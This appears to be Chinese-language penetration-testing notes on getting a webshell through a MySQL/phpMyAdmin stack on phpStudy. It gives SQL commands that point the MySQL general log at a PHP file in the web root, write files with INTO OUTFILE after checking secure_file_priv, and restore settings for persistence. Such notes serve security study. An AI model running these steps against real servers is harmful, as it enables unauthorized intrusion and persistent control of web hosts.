## 信息收集

1.首页**Mysql + Apache + PHP** 

![image-20221017203536606](../Picture/image-20221017203536606.png)

2.访问**/readme** 得到对应phpmyadmin详细版本

![image-20221017203736577](../Picture/image-20221017203736577.png)

## 日志getshell

```mysql
// 检查日志参数
SHOW VARIABLES LIKE 'general%';
```

<img src="../Picture/image-20221017204714562.png" alt="image-20221017204714562" style="zoom:150%;" />

**开启状态 / 日志保存路径**

```mysql
SET  GLOBAL general_log =  "ON";
```

```mysql
//参考源目录补充shell目录 	目录双写
SET global general_log_file=’C:/phpStudy/PHPTutorial/WWW/testshell.php’;
```

```mysql
select maer~
```

![image-20221017211927531](../Picture/image-20221017211927531.png)

**getshell，之后恢复记录——持久化操作**



## 文件写入与导出

```mysql

SHOW GLOBAL VARIABLES LIKE '%secure%'
```

secure_file_priv配置介绍：

secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限

当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权
当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权
当 secure_file_priv 的值**==没有具体值==**时，表示不对 mysqld 的导入|导出做限制，此时可提权

**导出开关需要管理员权限。**

**假设值为空：**(双写\\)

```mysql
select 'maer' INTO OUTFILE 'D:\\phpStudy\\PHPTutorial\\WWW\\2.php'
```

路径：

```mysql
SHOW  VARIABLES  LIKE  '%dir%'
```